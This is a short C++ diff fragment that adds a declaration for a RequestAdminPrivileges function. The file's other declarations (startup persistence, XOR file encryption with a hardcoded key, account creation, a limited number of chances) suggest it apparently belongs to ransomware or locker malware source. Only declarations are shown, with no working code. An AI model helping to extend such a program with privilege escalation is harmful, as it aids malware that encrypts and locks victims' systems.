@@ -17,6 +17,7 @@ const string decryptKey = "errorfatal0x00";
 const string browserAUMID = "Microsoft.MicrosoftEdge_8wekyb3d8bbwe";
 const int maxChances = 3;
 
+void RequestAdminPrivileges();
 void addToStartup();
 void xorEncryptDecryptFile(const string& filePath, const string& key);
 void createNewAccount(const string& username, const string& password);
